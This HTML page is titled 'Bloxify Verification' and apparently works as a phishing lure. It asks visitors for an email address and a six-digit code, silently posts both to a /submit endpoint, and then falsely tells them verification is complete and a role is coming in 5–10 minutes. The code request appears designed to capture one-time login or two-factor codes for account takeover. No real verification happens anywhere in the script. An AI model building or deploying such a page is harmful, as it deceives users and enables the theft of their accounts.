<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #000;
    font-family: system-ui, sans-serif;
}

/* CANVAS SPACE */
canvas {
    position: fixed;
    inset: 0;
}

/* UI CARD */
#card {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 520px;
    padding: 40px;
    background: linear-gradient(160deg, #1c1c1c, #0b0b0b);
    border-radius: 20px;
    box-shadow: 0 30px 80px rgba(0,0,0,.8), inset 0 0 30px rgba(255,255,255,.05);
    text-align: center;
    animation: float 6s ease-in-out infinite;
}

@keyframes float {
    50% { transform: translate(-50%, -55%); }
}

h1 {
    color: #f2f2f2;
    margin-bottom: 10px;
}

p {
    color: #aaa;
    font-size: 14px;
}

input {
    width: 100%;
    padding: 14px;
    margin-top: 14px;
    background: #121212;
    border: 1px solid #2a2a2a;
    border-radius: 10px;
    color: white;
    font-size: 16px;
}

button {
    width: 100%;
    padding: 14px;
    margin-top: 18px;
    background: linear-gradient(145deg, #2d2d2d, #141414);
    border: none;
    border-radius: 10px;
    color: white;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background: #333;
}
</style>
</head>

<body>
<canvas id="space"></canvas>

<div id="card">
    <h1>Bloxify Verification</h1>
    <p>Verify your account to gain access.</p>

    <input id="email" placeholder="Email address">
    <button onclick="step1()">Continue</button>

    <div id="step2" style="display:none">
        <input id="code" placeholder="6-digit code">
        <button onclick="submit()">Verify</button>
    </div>

    <p id="done" style="display:none">
        ✅ Verification complete<br>
        Please wait 5–10 minutes to receive your role.
    </p>
</div>

<script>
/* ===== SPACE CANVAS ===== */
const c = document.getElementById("space");
const ctx = c.getContext("2d");
let w, h, stars;

function resize() {
    w = c.width = window.innerWidth;
    h = c.height = window.innerHeight;
    stars = Array.from({length: 120}, () => ({
        x: Math.random()*w,
        y: Math.random()*h,
        z: Math.random()*1.5 + 0.5
    }));
}
window.onresize = resize;
resize();

c.onclick = e => {
    stars.forEach(s => {
        const dx = s.x - e.clientX;
        const dy = s.y - e.clientY;
        s.x += dx * 0.2;
        s.y += dy * 0.2;
    });
};

function draw() {
    ctx.clearRect(0,0,w,h);
    stars.forEach(s => {
        s.y += s.z;
        if (s.y > h) s.y = 0;
        ctx.fillStyle = "white";
        ctx.beginPath();
        ctx.arc(s.x, s.y, s.z*2, 0, Math.PI*2);
        ctx.fill();
    });
    requestAnimationFrame(draw);
}
draw();

/* ===== UI LOGIC ===== */
function step1() {
    document.getElementById("step2").style.display = "block";
}

function submit() {
    fetch("/submit", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
            email: email.value,
            code: code.value
        })
    });

    document.getElementById("step2").style.display = "none";
    document.getElementById("done").style.display = "block";
}
</script>
</body>
</html>
